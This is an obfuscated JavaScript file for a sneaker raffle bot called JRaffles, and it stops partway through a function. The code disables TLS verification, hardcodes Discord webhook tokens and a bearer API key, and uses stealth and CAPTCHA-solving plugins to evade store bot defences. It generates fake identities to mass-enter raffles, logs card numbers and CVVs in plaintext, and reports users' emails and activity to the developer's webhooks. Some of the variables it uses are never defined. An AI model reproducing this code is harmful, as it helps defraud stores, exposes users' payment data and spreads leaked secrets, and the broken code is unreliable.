process['env']['NODE_TLS_REJECT_UNAUTHORIZED'] = '0';
var _0x5deaaa = require('node-imap'), _0x4e3e82 = require('util')['inspect'];
const _0x45f099 = require('mailparser')['simpleParser'], { EmbedBuilder: _0x5ded05 } = require('discord.js');
var _0xad0d56 = require('exe');
const { execFile: _0x8b90a8 } = require('child_process'), _0x3dd4ff = require('puppeteer-extra'), _0x48a614 = require('puppeteer-extra-plugin-recaptcha'), _0x191e47 = require('puppeteer-extra-plugin-stealth'), _0x351e10 = require('chalk'), _0x3feae7 = require('node-bash-title'), _0x3a2baa = require('fs'), _0x56624d = require('axios'), _0x4b2684 = require('papaparse');
var _0x547f90 = require('random-name');
const _0x2ed36a = require('request');
var _0x525726 = require('prompt');
const _0x3b7fa9 = _0x2ed36a['jar']();
var _0x196f8e = {};
const _0x36e9a2 = '1067398661929181186/wvxr1d4nwFDFE-hAKBisU_mVWLloqatitfWvCqqIv38EUYiJMm_Pr3VKsuLsUBKN3PPj', _0x35eb1e = '1067398862056210432/TZs7kSEcDtUD13Vzl7VQhculxdtocZI8HKU7l_fW_W0qthftmSpHxNDY9NB3Hc4v6Yhy', _0x1a1c66 = '1068515411877957743/t_TXlLhYbeQmPL19hyGeNqi1G0KPT8KCBYOVOcryGMvXPfIUBEpNZRBCC1j7OFRej4A6', _0x3e2613 = '1068519704525807616/luGgvM1ZbR7g1zM5-10y5yceL2OGVCjrlkB6XxQL-hdoHUJ6hwSVAn6vVNyieHWLqPHE', _0x11b4c0 = '1070657276525940746/GSfXwIxjuRjwmP3sTDw73M4V2P5OJqMFgZyECtpBwFmtXGINvj1xFsVsZ2KwGBpJNHpn', _0x5e805f = '1072865476457287711/EePVQu0bb06IdHG3FfG7M-JDaE-38prupCPoCqaduP6mG_tsshUSaKidyfyVx0YgNC7e';
var _0x97c8d2 = 'https://discord.com/api/webhooks/', _0x45c490 = '' + _0x97c8d2 + _0x1a1c66, _0x1796bc = '' + _0x97c8d2 + _0x3e2613, _0x26f37d = '' + _0x97c8d2 + _0x36e9a2, _0x491127 = '' + _0x97c8d2 + _0x35eb1e, _0xf106b7 = '' + _0x97c8d2 + _0x11b4c0, _0x503745 = '' + _0x97c8d2 + _0x5e805f;
const _0x1c9d28 = JSON['parse'](_0x3a2baa['readFileSync']('../package.json', 'utf-8')), _0x5c71b0 = _0x1c9d28['version'];
var _0x147e1b, _0x3f5f24, _0x42dc56, _0x14ca0e, _0x40b25d, _0x4c7610, _0x2ccb52, _0x2f6bc3;
const _0x4cea75 = 'pk_7R7rRwMpveiR8OufEx9xIDMdU8Y95GgvGLF59wWRqklMwhXdpDnh5sN2KfaPHjEe';
let _0xeb1e3 = ![];
const _0x176d68 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', _0x52b6e9 = '0123456789';
var _0x1c11f2 = _0x176d68['split']('');
const _0x2023ad = require('auto-git-update'), { PageEmittedEvents: _0x3e6f3f } = require('puppeteer'), { getRandomValues: _0x3e5fbd } = require('crypto'), { resolve: _0x12f908 } = require('path'), { Console: _0x5ef181 } = require('console'), _0x4da23e = {
    'repository': 'https://github.com/Jarno97/JRafflesBot',
    'branch': 'main',
    'fromReleases': ![],
    'tempLocation': 'C:/temp/jraffles',
    'ignoreFiles': [
        'settings.json',
        'proxies.txt',
        'tasks/maha.csv',
        'tasks/footshop.csv',
        'tasks/afew.csv',
        'tasks/oqium.csv',
        'tasks/patta.csv',
        'accounts/patta.csv',
        'tasks/kickz.csv',
        'accounts/kickz-verified.csv',
        'accounts/kickz-unverified.csv'
    ]
}, _0x4440f0 = new _0x2023ad(_0x4da23e);
async function _0x3f380f() {
    _0x40b25d = _0x3a2baa['readdirSync']('../proxies'), _0x14ca0e = _0x3a2baa['readdirSync']('../tasks'), !_0x3a2baa['existsSync']('../accounts/fenom.csv') && _0x3a2baa['writeFileSync']('../accounts/fenom.csv', 'Email,Password\x0a'), !_0x3a2baa['existsSync']('../accounts/bstn.csv') && _0x3a2baa['writeFileSync']('../accounts/bstn.csv', 'Email,Password\x0a'), !_0x3a2baa['existsSync']('../accounts/eql.csv') && _0x3a2baa['writeFileSync']('../accounts/eql.csv', 'Email,Password,Phone\x0a'), !_0x3a2baa['existsSync']('../failed-tasks.csv') && _0x3a2baa['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), !_0x3a2baa['existsSync']('../successful-tasks.csv') && _0x3a2baa['writeFileSync']('../successful-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), _0x196f8e = JSON['parse'](_0x3a2baa['readFileSync']('../settings.json', 'utf-8')), !_0x196f8e['delay'] && (_0x196f8e['delay'] = 0x3c, _0x3a2baa['writeFileSync']('../settings.json', JSON['stringify'](_0x196f8e, null, 0x2))), !_0x196f8e['masterMail'] && (_0x196f8e['masterMail'] = 'yourmail@gmail.com', _0x3a2baa['writeFileSync']('../settings.json', JSON['stringify'](_0x196f8e, null, 0x2))), !_0x196f8e['masterPassword'] && (_0x196f8e['masterPassword'] = 'read\x20the\x20guide\x20on\x20how\x20to\x20get\x20an\x20APP\x20PASSWORD', _0x3a2baa['writeFileSync']('../settings.json', JSON['stringify'](_0x196f8e, null, 0x2))), !_0x196f8e['captchaKey'] && (_0x196f8e['captchaKey'] = '', _0x3a2baa['writeFileSync']('../settings.json', JSON['stringify'](_0x196f8e, null, 0x2))), !_0x196f8e['useRandomProxy'] && (_0x196f8e['useRandomProxy'] = !![], _0x3a2baa['writeFileSync']('../settings.json', JSON['stringify'](_0x196f8e, null, 0x2))), !_0x196f8e['shuffleTasks'] && (_0x196f8e['shuffleTasks'] = ![], _0x3a2baa['writeFileSync']('../settings.json', JSON['stringify'](_0x196f8e, null, 0x2))), !_0x196f8e['webhook'] && (_0x196f8e['webhook'] = '', _0x3a2baa['writeFileSync']('../settings.json', JSON['stringify'](_0x196f8e, null, 0x2))), _0x196f8e['delay'] <= 0x1388 && (_0x196f8e['delay'] = _0x196f8e['delay'] * 0x3e8), _0x196f8e['AfewDelay'] && (delete _0x196f8e['AfewDelay'], _0x3a2baa['writeFileSync']('../settings.json', JSON['stringify'](_0x196f8e, null, 0x2))), _0x196f8e['MahaDelay'] && (delete _0x196f8e['MahaDelay'], _0x3a2baa['writeFileSync']('../settings.json', JSON['stringify'](_0x196f8e, null, 0x2))), _0x196f8e['footshopDelay'] && (delete _0x196f8e['footshopDelay'], _0x3a2baa['writeFileSync']('../settings.json', JSON['stringify'](_0x196f8e, null, 0x2))), _0x196f8e['MahaDelay'] = _0x196f8e['delay'], _0x97c8d2 = _0x196f8e['webhook'], _0x4c7610 = _0x196f8e['licenseKey'];
}
let _0x209528, _0x417479 = [], _0x54f8b8;
const _0x54262e = _0x4969b7 => new Promise(_0x386a35 => setTimeout(_0x386a35, _0x4969b7));
function _0x1b14ea(_0x22eeea, _0x5bc60f) {
    return Math['floor'](Math['random']() * (_0x5bc60f - _0x22eeea + 0x1) + _0x22eeea);
}
function _0x28de7d(_0x369990) {
    let _0x1e2d9f = _0x369990['length'], _0x4a040b;
    while (_0x1e2d9f != 0x0) {
        _0x4a040b = Math['floor'](Math['random']() * _0x1e2d9f), _0x1e2d9f--, [_0x369990[_0x1e2d9f], _0x369990[_0x4a040b]] = [
            _0x369990[_0x4a040b],
            _0x369990[_0x1e2d9f]
        ];
    }
    return _0x369990;
}
async function _0x4a8240(_0x4f7780) {
    return _0x56624d['get']('https://api.hyper.co/v4/licenses/' + _0x4f7780, { 'headers': { 'Authorization': 'Bearer\x20' + _0x4cea75 } })['then'](_0x47f5a7 => _0x47f5a7['data'])['catch'](() => null);
}
;
async function _0x77551f(_0x59dfea) {
    console['clear']();
    if (_0x59dfea == 'AWGH-0N92-JE6S-HOHU') {
        console['log']('Please\x20paste\x20your\x20key\x20here:');
        var _0x3931a0 = await _0x525726['get']('License');
        if (_0x3931a0['License'] == 'AWGH-0N92-JE6S-HOHU')
            return console['log']('Error\x20please\x20use\x20the\x20key\x20on\x20the\x20JRaffles\x20dashboard'), await _0x54262e(0xbb8), _0x77551f(_0x59dfea);
        _0x59dfea = _0x3931a0['License'], _0x196f8e['licenseKey'] = _0x59dfea, _0x4c7610 = _0x59dfea, _0x3a2baa['writeFileSync']('../settings.json', JSON['stringify'](_0x196f8e));
    }
    console['log']('Checking\x20license\x20' + _0x4c7610 + '...'), await _0x54262e(0x320);
    const _0x32dbf4 = await _0x4a8240(_0x59dfea);
    _0x2ccb52 = JSON['stringify'](_0x32dbf4['user']['discord']['username'])['substring'](0x1)['slice'](0x0, -0x1), _0x2f6bc3 = JSON['stringify'](_0x32dbf4['user']['discord']['avatar'])['substring'](0x1)['slice'](0x0, -0x1);
    if (!_0x32dbf4)
        return console['log']('License\x20not\x20found');
    if (!_0x32dbf4['user'])
        return console['log']('License\x20not\x20bound');
    return _0x32dbf4['status'] === 'active' ? (console['log']('License\x20is\x20good\x20to\x20go!'), _0xeb1e3 = !![]) : (console['log']('Could\x20not\x20find\x20license..'), _0xeb1e3 = ![]);
}
async function _0x2d5dd7() {
    var _0x57627d = await _0x525726['get']('Module');
    return console['clear'](), _0x57627d['Module'];
}
;
async function _0xadb7fe() {
    var _0x2dc940 = await _0x525726['get']('Setting');
    return console['clear'](), _0x2dc940['Setting'];
}
async function _0x39b490() {
    console['clear'](), console['log']('Choose\x20A\x20File\x20to\x20Run\x20\x0a');
    for (var _0x50c829 = 0x0; _0x50c829 < _0x14ca0e['length']; _0x50c829++) {
        console['log']('\x20(' + _0x50c829 + ')\x20' + _0x14ca0e[_0x50c829]);
    }
    console['log']('');
    var _0x51262a = await _0x525726['get']('Task');
    if (_0x51262a['Task'] > _0x14ca0e['length'] - 0x1 || isNaN(_0x51262a['Task']) == !![])
        return console['log']('Invalid\x20selection'), await _0x54262e(0x3e8), _0x39b490();
    var _0x9d6cd5 = _0x3a2baa['readFileSync']('../tasks/' + _0x14ca0e[_0x51262a['Task']], 'utf-8');
    return _0x42dc56 = _0x4b2684['parse'](_0x9d6cd5, { 'header': !![] })['data'], console['clear'](), console['log']('Running\x20' + _0x351e10['blue'](_0x14ca0e[_0x51262a['Task']])), _0x147e1b = _0x14ca0e[_0x51262a['Task']], _0x42dc56;
}
async function _0x5268ba() {
    console['clear'](), console['log']('Choose\x20Proxies\x20to\x20Use\x20\x0a');
    for (var _0x4d2f9c = 0x0; _0x4d2f9c < _0x40b25d['length']; _0x4d2f9c++) {
        console['log']('\x20(' + _0x4d2f9c + ')\x20' + _0x40b25d[_0x4d2f9c]);
    }
    console['log']('');
    var _0x26aea2 = await _0x525726['get']('Proxies');
    if (_0x26aea2['Proxies'] > _0x40b25d['length'] - 0x1 || isNaN(_0x26aea2['Proxies']) == !![])
        return console['log']('Invalid\x20selection'), await _0x54262e(0x3e8), _0x5268ba();
    var _0x2970e0 = _0x3a2baa['readFileSync']('../proxies/' + _0x40b25d[_0x26aea2['Proxies']], 'utf-8')['split']('\x0a');
    let _0x167053 = _0x2970e0['map']((_0x515f86, _0x3c09e7) => {
        sanatizeProxy = _0x515f86['replace']('\x0d', '');
        if (_0x2970e0[_0x3c09e7 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x3f5f24 = _0x40b25d[_0x26aea2['Proxies']], console['clear'](), _0x167053;
}
async function _0x47aa97() {
    var _0x1a39c0 = await _0x525726['get']('Value');
    return console['clear'](), _0x1a39c0['Value'];
}
async function _0x449936(_0x59508b) {
    console['clear'](), console['log']('What\x20would\x20you\x20like\x20to\x20do?\x20\x0a');
    for (var _0x439098 = 0x0; _0x439098 < _0x59508b['length']; _0x439098++) {
        console['log']('\x20(' + _0x439098 + ')\x20[' + _0x59508b[_0x439098]['name'] + ']');
    }
    ;
    console['log']('');
    var _0x10dfbc = await _0x525726['get']('Module');
    return _0x10dfbc['Module'];
}
async function _0x5e68ab() {
    var _0x18800e = await _0x525726['get']('Password');
    return console['clear'](), _0x18800e['Password'];
}
;
async function _0x45e989() {
    var _0x3c5f4f = await _0x525726['get']('Links');
    return _0x3c5f4f['Links'];
}
;
async function _0x15db06() {
    console['log']('Choose\x20a\x20Raffle\x20to\x20enter:\x20\x0a');
    for (var _0x54e401 = 0x0; _0x54e401 < _0x417479['length']; _0x54e401++) {
        console['log']('\x20(' + _0x54e401 + ')\x20' + _0x417479[_0x54e401]);
    }
    ;
    console['log']();
    let _0x572af7 = await _0x525726['get']('Product');
    return console['clear'](), _0x572af7['Product'];
}
;
function _0x508dba() {
    var _0x961e9c = new Date(Date['now']())['toLocaleTimeString']();
    return _0x961e9c;
}
;
function _0x268e5b() {
    var _0x1cb076 = new Date(Date['now']())['toLocaleString']();
    return _0x1cb076['replace'](',', '');
}
async function _0x459a7f(_0x17f672, _0x431156) {
    let _0x52c666 = { 'headers': { 'content-type': 'application/json' } };
    if (_0x5c71b0 != 'devkey') {
        await _0x56624d['post'](_0x17f672, _0x431156, _0x52c666);
        return;
    }
    return console['log']('devkey\x20settings\x20enabled,\x20not\x20sending\x20webhooks');
}
;
async function _0x107feb(_0x648873, _0x505ab9, _0x31a623, _0x43d9b5, _0x53f274) {
    if (!_0x43d9b5 && _0x31a623 == 'dev') {
        var _0x362d9e = new _0x5ded05()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Raffle\x20Entry')['setAuthor']({
            'name': 'JRaffles',
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
            'url': 'https://twitter.com/JRaffles_'
        })['setThumbnail'](_0x505ab9['logo'])['addFields']({
            'name': 'Store',
            'value': '' + _0x505ab9['store'],
            'inline': !![]
        })['addFields']({
            'name': 'Size',
            'value': '' + _0x648873['Size'],
            'inline': !![]
        })['addFields']({
            'name': 'Delay',
            'value': '' + _0x196f8e['delay'],
            'inline': !![]
        })['addFields']({
            'name': 'User',
            'value': '' + _0x2ccb52,
            'inline': !![]
        })['addFields']({
            'name': 'URL',
            'value': '' + _0x648873['Url'],
            'inline': !![]
        })['addFields']({
            'name': 'Mail',
            'value': '' + _0x648873['Email'],
            'inline': !![]
        })['setTimestamp']()['setFooter']({
            'text': 'JRaffles\x20v' + _0x5c71b0,
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
        });
        return _0x362d9e['data'];
    } else {
        if (_0x43d9b5 && _0x31a623 == 'dev') {
            var _0x362d9e = new _0x5ded05()['setColor'](0xc0d6d6)['setTitle']('Failed\x20Raffle\x20Entry')['setAuthor']({
                'name': 'JRaffles',
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                'url': 'https://twitter.com/JRaffles_'
            })['setThumbnail'](_0x505ab9['logo'])['addFields']({
                'name': 'User',
                'value': '' + _0x2ccb52,
                'inline': !![]
            }, {
                'name': 'Store',
                'value': '' + _0x505ab9['store'],
                'inline': !![]
            }, {
                'name': 'Size',
                'value': '' + _0x648873['Size'],
                'inline': !![]
            }, {
                'name': 'Delay',
                'value': '' + _0x196f8e['delay'],
                'inline': !![]
            })['addFields']({
                'name': 'ERROR',
                'value': '' + _0x53f274,
                'inline': !![]
            })['addFields']({
                'name': 'URL',
                'value': '' + _0x648873['Url']
            })['addFields']({
                'name': 'Mail',
                'value': '' + _0x648873['Email'],
                'inline': !![]
            })['setTimestamp']()['setFooter']({
                'text': 'JRaffles\x20v' + _0x5c71b0,
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
            });
            return _0x362d9e['data'];
        } else {
            if (_0x31a623 == 'pub') {
                var _0x362d9e = new _0x5ded05()['setColor'](0xc0d6d6)['setTitle']('Succesful\x20Raffle\x20Entry')['setAuthor']({
                    'name': 'JRaffles',
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                    'url': 'https://twitter.com/JRaffles_'
                })['setThumbnail'](_0x505ab9['logo'])['addFields']({
                    'name': 'Store',
                    'value': '' + _0x505ab9['store'],
                    'inline': !![]
                }, {
                    'name': 'Size',
                    'value': '' + _0x648873['Size'],
                    'inline': !![]
                }, {
                    'name': 'Delay',
                    'value': '' + _0x196f8e['delay'],
                    'inline': !![]
                })['addFields']({
                    'name': 'URL',
                    'value': '||' + _0x648873['Url'] + '||'
                })['setTimestamp']()['setFooter']({
                    'text': 'JRaffles\x20v' + _0x5c71b0,
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                });
                return _0x362d9e['data'];
            } else {
                if (_0x31a623 == 'acc' && !_0x43d9b5) {
                    var _0x362d9e = new _0x5ded05()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generated')['setAuthor']({
                        'name': 'JRaffles',
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                        'url': 'https://twitter.com/JRaffles_'
                    })['setThumbnail'](_0x505ab9['logo'])['addFields']({
                        'name': 'User',
                        'value': '' + _0x2ccb52,
                        'inline': !![]
                    }, {
                        'name': 'Store',
                        'value': '' + _0x505ab9['store'],
                        'inline': !![]
                    }, {
                        'name': 'Delay',
                        'value': '' + _0x196f8e['delay'],
                        'inline': !![]
                    })['setTimestamp']()['setFooter']({
                        'text': 'JRaffles\x20v' + _0x5c71b0,
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                    });
                    return _0x362d9e['data'];
                } else {
                    if (_0x31a623 == 'acc' && _0x43d9b5) {
                        var _0x362d9e = new _0x5ded05()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generation\x20Failed')['setAuthor']({
                            'name': 'JRaffles',
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                            'url': 'https://twitter.com/JRaffles_'
                        })['setThumbnail'](_0x505ab9['logo'])['addFields']({
                            'name': 'User',
                            'value': '' + _0x2ccb52,
                            'inline': !![]
                        }, {
                            'name': 'Error',
                            'value': '' + _0x53f274,
                            'inline': !![]
                        }, {
                            'name': 'Store',
                            'value': '' + _0x505ab9['store'],
                            'inline': !![]
                        }, {
                            'name': 'Delay',
                            'value': '' + _0x196f8e['delay'],
                            'inline': !![]
                        })['setTimestamp']()['setFooter']({
                            'text': 'JRaffles\x20v' + _0x5c71b0,
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                        });
                        return _0x362d9e['data'];
                    } else {
                        if (_0x31a623 == 'open') {
                            var _0x362d9e = new _0x5ded05()['setColor'](0xc0d6d6)['setTitle']('User\x20Opened\x20JRaffles')['setAuthor']({
                                'name': 'JRaffles',
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                'url': 'https://twitter.com/JRaffles_'
                            })['setThumbnail'](_0x2f6bc3)['addFields']({
                                'name': 'User',
                                'value': '' + _0x2ccb52,
                                'inline': !![]
                            })['setTimestamp']()['setFooter']({
                                'text': 'JRaffles\x20v' + _0x5c71b0,
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                            });
                            return _0x362d9e['data'];
                        } else {
                            if (!_0x43d9b5 && _0x31a623 == 'ver') {
                                var _0x362d9e = new _0x5ded05()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Verification')['setAuthor']({
                                    'name': 'JRaffles',
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                    'url': 'https://twitter.com/JRaffles_'
                                })['setThumbnail'](_0x505ab9['logo'])['addFields']({
                                    'name': 'User',
                                    'value': '' + _0x2ccb52,
                                    'inline': !![]
                                }, {
                                    'name': 'Store',
                                    'value': '' + _0x505ab9['store'],
                                    'inline': !![]
                                }, {
                                    'name': 'Delay',
                                    'value': '' + _0x196f8e['delay'],
                                    'inline': !![]
                                })['setTimestamp']()['setFooter']({
                                    'text': 'JRaffles\x20v' + _0x5c71b0,
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                });
                                return _0x362d9e['data'];
                            } else {
                                if (_0x43d9b5 && _0x31a623 == 'ver') {
                                    var _0x362d9e = new _0x5ded05()['setColor'](0xc0d6d6)['setTitle']('Verification\x20Failed')['setAuthor']({
                                        'name': 'JRaffles',
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                        'url': 'https://twitter.com/JRaffles_'
                                    })['setThumbnail'](_0x505ab9['logo'])['addFields']({
                                        'name': 'User',
                                        'value': '' + _0x2ccb52,
                                        'inline': !![]
                                    }, {
                                        'name': 'Error',
                                        'value': '' + _0x53f274,
                                        'inline': !![]
                                    }, {
                                        'name': 'Store',
                                        'value': '' + _0x505ab9['store'],
                                        'inline': !![]
                                    }, {
                                        'name': 'Delay',
                                        'value': '' + _0x196f8e['delay'],
                                        'inline': !![]
                                    })['setTimestamp']()['setFooter']({
                                        'text': 'JRaffles\x20v' + _0x5c71b0,
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                    });
                                    return _0x362d9e['data'];
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
async function _0x2e3034(_0x491ca2, _0x2e13bc) {
    var _0x2230f0 = _0x491ca2[_0x2e13bc]['Address1']['split'](''), _0x4df315 = _0x491ca2[_0x2e13bc]['Address2']['split'](''), _0x44b5a4 = _0x491ca2[_0x2e13bc]['Email']['split']('@');
    for (var _0xd466a7 = 0x0; _0xd466a7 < _0x2230f0['length']; _0xd466a7++) {
        if (_0x2230f0[_0xd466a7] == 'X') {
            var _0x51c01c = Math['round'](Math['random']() * (_0x176d68['length'] - 0x1));
            _0x2230f0[_0xd466a7] = _0x1c11f2[_0x51c01c];
        }
    }
    ;
    for (var _0xd466a7 = 0x0; _0xd466a7 < _0x4df315['length']; _0xd466a7++) {
        if (_0x4df315[_0xd466a7] == 'X') {
            var _0x51c01c = Math['round'](Math['random']() * (_0x176d68['length'] - 0x1));
            _0x4df315[_0xd466a7] = _0x1c11f2[_0x51c01c];
        }
    }
    ;
    _0x491ca2[_0x2e13bc]['FirstName'] == 'RANDOM' && (_0x491ca2[_0x2e13bc]['FirstName'] = _0x547f90['first']());
    _0x491ca2[_0x2e13bc]['LastName'] == 'RANDOM' && (_0x491ca2[_0x2e13bc]['LastName'] = _0x547f90['last']());
    _0x44b5a4[0x0] == 'RANDOM' ? _0x44b5a4[0x0] = '' + _0x547f90['first']() + _0x547f90['last']() + _0x1b14ea(0x1, 0x270f) + '@' : _0x44b5a4[0x0] = _0x44b5a4[0x0] + '@';
    _0x491ca2[_0x2e13bc]['Email'] = _0x44b5a4['join'](''), _0x491ca2[_0x2e13bc]['Address1'] = _0x2230f0['join'](''), _0x491ca2[_0x2e13bc]['Address2'] = _0x4df315['join']('');
    _0x491ca2[_0x2e13bc]['Phone'] == 'RANDOM' && (_0x491ca2[_0x2e13bc]['Phone'] = '0' + _0x1b14ea(0x5f5e100, 0x3b9ac9ff));
    if (_0x491ca2[_0x2e13bc]['Follower'] == 'RANDOM') {
        var _0x2aa8fe = _0x1b14ea(0x1, 0x270f);
        _0x491ca2[_0x2e13bc]['Follower'] = '' + _0x547f90['first']() + _0x547f90['last']() + _0x2aa8fe + '\x20';
    }
    _0x491ca2[_0x2e13bc]['HouseNumber'] == 'RANDOM' && (_0x491ca2[_0x2e13bc]['HouseNumber'] = _0x1b14ea(0x1, 0xc8));
    if (_0x491ca2[_0x2e13bc]['Address1'] == 'RANDOM') {
        var _0x367d98 = Math['round'](Math['random']() * (_0x176d68['length'] - 0x1)), _0x4de951 = _0x1c11f2[_0x367d98];
        _0x491ca2[_0x2e13bc]['Address1'] = _0x547f90['last']() + 'straat', _0x491ca2[_0x2e13bc]['Zip'] == '' && (_0x491ca2[_0x2e13bc]['Postcode'] = _0x1b14ea(0x3e8, 0x270f) + '\x20' + _0x4de951 + _0x4de951, _0x491ca2[_0x2e13bc]['Zip'] = _0x491ca2[_0x2e13bc]['Postcode']), _0x491ca2[_0x2e13bc]['HouseNumber'] = '' + _0x1b14ea(0x1, 0xc8);
    }
    return;
}
;
async function _0x29ff38(_0x35002f, _0x5ccfe0) {
    _0x3a2baa['appendFileSync']('../failed-tasks.csv', _0x268e5b() + ',' + _0x5ccfe0['store'] + ',' + _0x5ccfe0['name'] + ',' + _0x35002f['Url'] + ',' + _0x35002f['Size'] + ',' + _0x35002f['Follower'] + ',' + _0x35002f['FirstName'] + ',' + _0x35002f['LastName'] + ',' + _0x35002f['Address1'] + ',' + _0x35002f['Address2'] + ',' + _0x35002f['HouseNumber'] + ',' + _0x35002f['Zip'] + ',' + _0x35002f['City'] + ',' + _0x35002f['State'] + ',' + _0x35002f['Country'] + ',' + _0x35002f['Phone'] + ',' + _0x35002f['Email'] + ',' + _0x35002f['Password'] + ',' + _0x35002f['PaymentMethod'] + ',' + _0x35002f['CardType'] + ',' + _0x35002f['NameOnCard'] + ',' + _0x35002f['CardNumber'] + ',' + _0x35002f['ExpiryDate'] + ',' + _0x35002f['CVV'] + ',' + _0x35002f['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
async function _0x3444cf(_0x5d3349, _0x555b38) {
    _0x3a2baa['appendFileSync']('../successful-tasks.csv', _0x268e5b() + ',' + _0x555b38['store'] + ',' + _0x555b38['name'] + ',' + _0x5d3349['Url'] + ',' + _0x5d3349['Size'] + ',' + _0x5d3349['Follower'] + ',' + _0x5d3349['FirstName'] + ',' + _0x5d3349['LastName'] + ',' + _0x5d3349['Address1'] + ',' + _0x5d3349['Address2'] + ',' + _0x5d3349['HouseNumber'] + ',' + _0x5d3349['Zip'] + ',' + _0x5d3349['City'] + ',' + _0x5d3349['State'] + ',' + _0x5d3349['Country'] + ',' + _0x5d3349['Phone'] + ',' + _0x5d3349['Email'] + ',' + _0x5d3349['Password'] + ',' + _0x5d3349['PaymentMethod'] + ',' + _0x5d3349['CardType'] + ',' + _0x5d3349['NameOnCard'] + ',' + _0x5d3349['CardNumber'] + ',' + _0x5d3349['ExpiryDate'] + ',' + _0x5d3349['CVV'] + ',' + _0x5d3349['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
function _0x3e1a77() {
    let _0xd49c24 = proxyFile['split']('\x0a'), _0x3fbe1a = _0xd49c24['map']((_0x3fc93f, _0x515f2e) => {
        sanatizeProxy = _0x3fc93f['replace']('\x0d', '');
        if (_0xd49c24[_0x515f2e + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x3fbe1a;
}
;
async function _0x32aaaf(_0x491bda) {
    var _0x767fb9 = _0x491bda[0x1]['split'](':');
    const _0x2174ae = await _0x3dd4ff['launch']({
        'headless': !![],
        'args': ['--proxy-server=' + _0x767fb9[0x0] + ':' + _0x767fb9[0x1] + ',--no-sandbox\x27,\x0a\x20\x20\x20\x20\x20\x20\x27--disable-setuid-sandbox,--force-device-scale-factor=0.3']
    });
    try {
        const _0x5c7b71 = await _0x2174ae['newPage']();
        await _0x5c7b71['authenticate']({
            'username': '' + _0x767fb9[0x2],
            'password': '' + _0x767fb9[0x3]
        }), console['log'](_0x508dba() + '\x20[' + _0x34a60a[taskModule]['name'] + ']\x20Afew\x20Scraper\x20started'), await _0x5c7b71['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x5c7b71['setRequestInterception'](!![]), _0x5c7b71['on']('request', _0x5b42eb => {
            _0x5b42eb['resourceType']() === 'image' || _0x5b42eb['resourceType']() === 'font' || _0x5b42eb['resourceType']() === 'media' ? _0x5b42eb['abort']() : _0x5b42eb['continue']();
        }), await _0x5c7b71['goto']('https://en.afew-store.com/collections/sneaker-raffles'), console['log'](_0x508dba() + '\x20[' + _0x34a60a[taskModule]['name'] + ']\x20Looking\x20for\x20Raffles'), await _0x5c7b71['waitForTimeout'](0xbb8), await _0x5c7b71['waitForSelector']('.product-card');
        const _0x30098d = await _0x5c7b71['$$eval']('a.product-card', _0x70ad96 => {
            return _0x70ad96['map'](_0xb4e269 => _0xb4e269['href']);
        });
        return _0x417479 = _0x30098d;
    } catch (_0x147c09) {
        console['log']('\x20' + _0x147c09);
    } finally {
        _0x2174ae['close'](), console['clear']();
    }
}
;
async function _0x4585f7(_0x18bc56, _0x20c0ea) {
    _0x3dd4ff['use'](_0x191e47()), _0x3dd4ff['use'](_0x48a614({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x196f8e['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x32ce38 = 0x0; _0x32ce38 < bouncewear['length']; _0x32ce38++) {
        await _0x2e3034(bouncewear, _0x32ce38);
